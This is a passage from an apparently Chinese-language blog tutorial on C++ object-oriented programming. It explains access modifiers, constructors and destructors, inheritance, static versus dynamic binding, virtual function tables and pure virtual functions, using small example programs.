<h4 id="类访问修饰符-amp-amp-数据封装"><a href="#类访问修饰符-amp-amp-数据封装" class="headerlink" title="类访问修饰符&amp;&amp;数据封装"></a>类访问修饰符&amp;&amp;数据封装</h4><p>关键字  <code>public</code> <code> private</code> <code>protected</code> 成为访问修饰符，它们标记的区域内可以设置成员变量的访问属性，比如上面的例子里，在main函数中我对 <code>Lenovo</code> 对象中的 <code>Memory</code> 成员进行了赋值为 <code>8</code> 的操作，之所以能够这样直接赋值是因为我将其定义为了公有（<code> public</code> ）成员，这就意味这我用 <code>.</code> 可以直接访问公有成员，但如果我将成员设置为私有（ <code>private</code> ）成员就无法这样直接访问了，正如同下面的代码一样</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span>:</span><br><span class="line">		<span class="type">int</span> length;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Box box;</span><br><span class="line">	box.length=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301051616143.png" alt="image-20230105161601838"></p>
<p>可以看到编译是给了一个 <code>error</code> 提示说 <code>Box::length</code> 这个成员是私有的，所以这里无法赋值。</p>
<p>因此我们可以将代码改成下面这样,通过公有的成员函数来访问私有的成员（<strong>所谓的私有成员指的是只能在类的内部被访问，而无法在外部进行访问</strong>），而公有的成员函数（在类内声明或定义的函数）自然是能够被外部访问。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span>:</span><br><span class="line">		<span class="type">int</span> length;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">set_length</span><span class="params">(<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			length=len;</span><br><span class="line">			std::cout &lt;&lt; length &lt;&lt; std::endl;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Box box;</span><br><span class="line">	box.<span class="built_in">set_length</span>(<span class="number">60</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关于 <code>protected</code> 修饰符与 <code>private</code> 非常类似，不同之处在于 <code>protected</code> 成员在派生类中是可以访问的。</p>
<p>你可能会问这个类访问修饰符出现的意义是什么？其实这就体现了 C++ 中的<strong>数据封装</strong>，我们可以将数据成员定义为私有，然后通过公有的成员函数作为接口来访问和操作私有成员，而无需知道具体实现的细节，这样就可以将实现细节与使用者隔离开，提高代码的可读性和可维护性。</p>
<h3 id="类构造函数-amp-amp-析构函数"><a href="#类构造函数-amp-amp-析构函数" class="headerlink" title="类构造函数&amp;&amp;析构函数"></a>类构造函数&amp;&amp;析构函数</h3><p>假设我现在想创建一个对象，就输出一个 <code>created successly</code> 或者是进行初始化的一些操作，总之就是在创建一个对象的时候自动调用一个函数来实现一些功能。那就需要用到构造函数了，它会在每次创建新对象的时候就被调用。</p>
<p>构造函数的名称要与类名一致，并且没有类型（也就是没有返回值类型）</p>
<p>代码如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span>:</span><br><span class="line">		<span class="type">int</span> length;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="built_in">Box</span>(<span class="type">void</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			std::cout &lt;&lt; <span class="string">&quot;created successly!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">set_length</span><span class="params">(<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			length=len;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">add_length</span><span class="params">(<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			length+=len;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">output_length</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			std::cout &lt;&lt; length &lt;&lt; std:: endl;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Box *p = <span class="keyword">new</span> <span class="built_in">Box</span>();</span><br><span class="line">	p-&gt;<span class="built_in">set_length</span>(<span class="number">20</span>);</span><br><span class="line">	p-&gt;<span class="built_in">add_length</span>(<span class="number">4</span>);</span><br><span class="line">	p-&gt;<span class="built_in">output_length</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301051700123.png" alt="image-20230105170056041"></p>
<p>当然了在上面的例子中也可以进行初始化的工作，比如想将每次创建的对象中的 <code>length</code> 都设置为100，那只需要对构造函数进行传参对 <code>length</code> 进行赋值即可。</p>
<p>假设我创建了一个对象，在释放前进行了一些打开文件和申请内存的操作，那么我希望在删除这个对象的时候，可以关闭之前打开的文件或者释放申请之前的内存，那这就要用到析构函数了，它会在删除对象的时候自动被触发，名字是在类名前面加了一个 <code>~</code> ，跟构造函数的利用类似，下面举例在每次删除对象的时候打印 <code>destruction succeeded!</code> </p>
<p>代码如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span>:</span><br><span class="line">		<span class="type">int</span> length;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="built_in">Box</span>(<span class="type">void</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			std::cout &lt;&lt; <span class="string">&quot;created successly!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		&#125;</span><br><span class="line">		~<span class="built_in">Box</span>(<span class="type">void</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			std::cout &lt;&lt; <span class="string">&quot;destruction succeeded!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">set_length</span><span class="params">(<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			length=len;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">add_length</span><span class="params">(<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			length+=len;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">output_length</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			std::cout &lt;&lt; length &lt;&lt; std:: endl;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Box *p = <span class="keyword">new</span> <span class="built_in">Box</span>();</span><br><span class="line">	p-&gt;<span class="built_in">set_length</span>(<span class="number">20</span>);</span><br><span class="line">	p-&gt;<span class="built_in">add_length</span>(<span class="number">4</span>);</span><br><span class="line">	p-&gt;<span class="built_in">output_length</span>();</span><br><span class="line">	<span class="keyword">delete</span> p;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301051753557.png" alt="image-20230105175301371"></p>
<h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>继承指的是类与类之间的一种关系，假设有一个类 <code>A</code> ，然后它具有 <code>100</code> 个属性，但是我现在希望去定义一个类 <code>B</code> ，它在原本 <code>A</code> 有的 <code>100</code> 个属性前提下再创建 <code>20</code> 个属性，怎么做呢？确实可以选择之间将类 <code>A</code> 的代码 <code>copy</code> 到  <code>B</code> 中，但这样显的代码过于臃肿。所以我们可以用继承， <code>B</code> 继承 <code>A</code> 所有的属性，在此基础上再增加自己新的属性。</p>
<p>下面的代码展示了继承</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="type">int</span> length;</span><br><span class="line">		<span class="type">int</span> width;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">set_length</span><span class="params">(<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			length=len;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">add_length</span><span class="params">(<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			length+=len;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">output_length</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			std::cout &lt;&lt; <span class="string">&quot;length is &quot;</span> &lt;&lt;length &lt;&lt; std::endl;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BBox</span> : <span class="keyword">public</span> Box</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="type">int</span> hight;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">set_hight</span><span class="params">(<span class="type">int</span> hei)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			hight=hei;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">output_hight</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			std::cout &lt;&lt; <span class="string">&quot;hight is &quot;</span> &lt;&lt; hight &lt;&lt; std::endl;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	BBox box;</span><br><span class="line">	box.<span class="built_in">set_length</span>(<span class="number">20</span>);</span><br><span class="line">	box.<span class="built_in">set_hight</span>(<span class="number">30</span>);</span><br><span class="line">	box.<span class="built_in">output_length</span>();</span><br><span class="line">	box.<span class="built_in">output_hight</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301051935782.png" alt="image-20230105193512645"></p>
<p>由此可以看出来， <code>BBox</code> 这个类（派生类）继承了 <code>BOX</code> 类（基类），然后实例化出来的 <code>box</code> 对象既拥有原本基类的属性和方法，又拥有新增加的属性和方法。</p>
<p>需要补充的是在定义这个继承类的时候执行了 <code>class BBox : public Box</code> 再次使用了 <code>public</code>  这个访问修饰符，标明了继承类型。我们通常使用 <code>public</code> 继承，很少使用 <code>protected</code> 和 <code>private</code> 继承。使用不同类型继承，遵循以下几个规则：</p>
<ol>
<li><strong>公有继承（public）：</strong>当一个类派生自<strong>公有</strong>基类时，基类的<strong>公有</strong>成员也是派生类的<strong>公有</strong>成员，基类的<strong>保护</strong>成员也是派生类的<strong>保护</strong>成员，基类的<strong>私有</strong>成员不能直接被派生类访问，但是可以通过调用基类的<strong>公有</strong>和<strong>保护</strong>成员来访问。</li>
<li><strong>保护继承（protected）：</strong> 当一个类派生自<strong>保护</strong>基类时，基类的<strong>公有</strong>和<strong>保护</strong>成员将成为派生类的<strong>保护</strong>成员。</li>
<li><strong>私有继承（private）：</strong>当一个类派生自<strong>私有</strong>基类时，基类的<strong>公有</strong>和<strong>保护</strong>成员将成为派生类的<strong>私有</strong>成员。</li>
</ol>
<p>上述规则转自：<a target="_blank" rel="noopener" href="https://www.runoob.com/cplusplus/cpp-inheritance.html">C++ 继承 | 菜鸟教程 (runoob.com)</a></p>
<h4 id="多继承"><a href="#多继承" class="headerlink" title="多继承"></a>多继承</h4><p>就是类 <code>A</code> 可以同时继承 <code>B</code> 和 <code>C</code> 中的所有属性和方法，被称之为多继承。字面意思就是其作用，指一个类可以同时继承多个类的特征。</p>
<p>代码如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="type">int</span> length;</span><br><span class="line">		<span class="type">int</span> width;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">set_length</span><span class="params">(<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			length=len;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">add_length</span><span class="params">(<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			length+=len;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">output_length</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			std::cout &lt;&lt; <span class="string">&quot;length is &quot;</span> &lt;&lt;length &lt;&lt; std::endl;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">obj</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> *color;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">set_color</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *col)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			color=col;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">output_color</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			std::cout &lt;&lt; <span class="string">&quot;color is &quot;</span> &lt;&lt; color &lt;&lt; std::endl;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BBox</span> : <span class="keyword">public</span> Box,<span class="keyword">public</span> obj</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="type">int</span> hight;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">set_hight</span><span class="params">(<span class="type">int</span> hei)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			hight=hei;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">output_hight</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			std::cout &lt;&lt; <span class="string">&quot;hight is &quot;</span> &lt;&lt; hight &lt;&lt; std::endl;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	BBox box;</span><br><span class="line">	box.<span class="built_in">set_length</span>(<span class="number">20</span>);</span><br><span class="line">	box.<span class="built_in">set_hight</span>(<span class="number">30</span>);</span><br><span class="line">	box.<span class="built_in">output_length</span>();</span><br><span class="line">	box.<span class="built_in">output_hight</span>();</span><br><span class="line">	box.<span class="built_in">set_color</span>(<span class="string">&quot;blue&quot;</span>);</span><br><span class="line">	box.<span class="built_in">output_color</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301052000403.png" alt="image-20230105200054215"></p>
<p>可以看到 <code>BBox</code> 同时继承了 <code>Box</code> 和 <code>obj</code> 两个类的属性和方法，并且成功调用。这个多继承理解起来应该蛮简单的，<strong>值得一提的是构造函数和析构函数不可以被继承</strong>。</p>
<h3 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h3><p>多态是针对具体某个函数而言的，称之为多态性。在 C++ 中，一个函数要想具有多态性，必须同时满足以下两个条件：</p>
<ol>
<li>函数是从基类继承而来的，即基类中定义了这个函数，而派生类中又重新定义了这个函数。</li>
<li>函数为动态绑定，这意味着函数的调用版本是在运行时确定的。在 C++ 中，可以使用虚函数来实现动态绑定。</li>
</ol>
<p>第一个条件很好理解，就是我在基类 <code>A</code> 中定义了函数 <code>print</code> ，在它的派生类 <code>B</code> 中我对继承来的函数 <code>print</code> 进行了重写。</p>
<h4 id="静态绑定"><a href="#静态绑定" class="headerlink" title="静态绑定"></a>静态绑定</h4><p>将第二个条件就要提到 C++ 里的静态绑定和动态绑定的概念，静态绑定指的是在编译时就已经可以确定调用的函数版本（也就是确定调用的这个函数属于哪个类中的），这样即使派生类重写了函数，也不会体现出多态的效果，静态绑定可以使程序执行的更快，因为编译器可以在编译时确定函数的调用版本，而不需要在运行时调用。</p>
<p>如下代码， <code>print</code> 函数就为静态绑定</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;B::print&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> : <span class="keyword">public</span> B &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;A::print&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    B b;</span><br><span class="line">    b.<span class="built_in">print</span>();  <span class="comment">// 静态绑定：B::print</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="动态绑定"><a href="#动态绑定" class="headerlink" title="动态绑定"></a>动态绑定</h4><p>动态绑定是函数在调用时确定的具体版本（也就是哪个类中的函数），而非在编译时就确定了。</p>
<p>这是通过指针来调用函数实现的，比如我定义了一个基类 <code>A</code> 的指针为 <code>a</code> ，然后申请了它的派生类 <code>B</code> 大小的空间，将指针 <code>a</code> 指向了申请 <code>B</code> 类的对象地址。这个写成代码应该为 <code>A* a = new B() </code> 。这里其实是我实例化了一个 <code>B</code> 类的对象，然后让指针 <code>a</code> 指向了这个对象的地址，这里之所以 <code>B</code> 后面带 <code>()</code>，是表示调用了 <code>B</code> 类的构造函数来创建 <code>B</code> 类对象。</p>
<p>而上述的情况就会导致，我可以给 <code>a</code> 指针任意赋值其他对象，因为 <code>a</code> 的指针类型为基类,所以我可以随意指向它的派生类，这就导致了我在编译的时候不能确定这个指针到底调用的哪个类中的方法。因此只能等到运行时确定，这就是所谓的动态绑定。</p>
<p>动态绑定的代码如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;A::print&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> : <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;B::print&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> : <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;C::print&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    A* a = <span class="keyword">new</span> <span class="built_in">B</span>();</span><br><span class="line">    a-&gt;<span class="built_in">print</span>();  <span class="comment">// 调用的是 B::print()</span></span><br><span class="line">    a = <span class="keyword">new</span> <span class="built_in">C</span>();</span><br><span class="line">    a-&gt;<span class="built_in">print</span>();  <span class="comment">// 调用的是 C::print()</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301052225623.png"></p>
<p><strong>注意</strong>：动态绑定的前提是基类中的函数被 <code>virtual</code> 关键词声明为虚函数才行，如果上述代码将基类中的 <code>virtual</code> 关键词去掉，那么输出结果就为两个 <code>A::print</code> 。因为编译器在处理的时候发现没有 <code>virtual</code> 就不会认为这是虚函数，<strong>从而你使用基类的指针即使调用派生类中的函数依然调用的是基类中的函数，依然不会去考虑指针所指向的对象的实际类型</strong>。</p>
<h4 id="虚函数-amp-amp-虚函数表-amp-amp-虚表指针"><a href="#虚函数-amp-amp-虚函数表-amp-amp-虚表指针" class="headerlink" title="虚函数&amp;&amp;虚函数表&amp;&amp;虚表指针"></a>虚函数&amp;&amp;虚函数表&amp;&amp;虚表指针</h4><p>上面的那段文字中出现了虚函数这个陌生的概念，这里来讲一下动态绑定是如何被实现的。</p>
<p>接下来将提到三个概念，分别是虚函数，虚函数表和虚表指针。</p>
<p>简单解释一下，虚函数表其实就是一个<strong>函数指针数组</strong>（就是存放虚函数指针的一个数组），虚表指针则是指向虚函数表的一个<strong>指针</strong>，虚函数则是被 <code>virtual</code> 关键字声明的函数。</p>
<p>我们考虑一下这个动态绑定，它是一个基类的指针，可以去指向派生类实例后的对象，从而去调用派生类中的函数，并且指向不同的派生类的对象，可以调用同一个函数名但作用不同的函数（这个就是函数的多态性）。具体实现过程如下：</p>
<p>首先在基类A中定义了虚函数，那么这个类A就会拥有一个虚函数表，这个表中会存放基类A中所有的虚函数地址（不是虚函数的话，就不会将地址放到这个虚函数表中）</p>
<p>方便理解，画了个示意图</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301052306391.png" alt="image-20230105230622294" style="zoom:50%;" />

<p>然后基类A实例化了一个对象，名为 <code>a</code> ，那么这个对象内部将包含一个虚表指针 <code>*__vptr</code>（这是编译器进行添加的），这个虚表指针就指向了自己这个类的虚函数表。</p>
<p>下面两个图分别是有虚函数和没有虚函数的类，可以看见他们的大小差了八个字节，刚好是64位程序里一个指针的大小，而这个指针就是编译器自动添加的虚表指针。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301052313274.png" alt="image-20230105231306685"></p>
<p><strong>基类中如果存在虚函数表的话，那么派生类则会将虚函数表也继承下来</strong>，如果<u>派生类中没有对基类中的函数进行重新定义，那么虚函数中的函数指针不变，如果派生类对某个基类中的函数进行了重新定义，那么虚函数表中的函数指针将被更新为新的虚函数地址。同样的，派生类实例化后的对象也具有一个虚表指针，来指向派生类自己的虚函数表</u>。</p>
<p>以下面的代码为例，具体说明一下动态绑定的实现过程</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;A::print&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> : <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;B::print&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> : <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;C::print&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    A* a = <span class="keyword">new</span> <span class="built_in">B</span>();</span><br><span class="line">    a-&gt;<span class="built_in">print</span>();  <span class="comment">// 调用的是 B::print()</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先， <code>A* a = new B()</code> 定义了一个类A的指针a（事实上接下来要说的和指针类型没有关系，即使这里是类B指针也完全可以），然后将B类实例化为对象的地址赋值给了 <code>a</code>，所以当前 <code>a</code> 可以通过对象中自己存储的一个 <code>vptr</code> 指针来访问到类B的虚函数表，从而去类B的虚函数中找到 <code>print</code>的函数指针并调用，最终输出 <code>B::print</code> 。</p>
<p><strong>注意：虽然上述操作和 <code>a</code> 指针的类型无关，但是不可以定义为类C的指针（也就是说这个指针的类型要么是基类，要么是当前这个派生类），因为这样会得到一个编译错误。</strong></p>
<h3 id="纯虚函数-amp-amp-抽象类"><a href="#纯虚函数-amp-amp-抽象类" class="headerlink" title="纯虚函数&amp;&amp;抽象类"></a>纯虚函数&amp;&amp;抽象类</h3><p>纯虚函数是一种<strong>虚函数</strong>，它没有实际实现，<strong>只有对函数的声明</strong>。纯虚函数是通过在<strong>函数声明的末尾添加一个 <code>=0</code> 来定义的</strong>，<strong>纯虚函数的目的就是要让基类的派生类去实现它</strong>。</p>
<p>纯虚函数的定义如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">makeSound</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

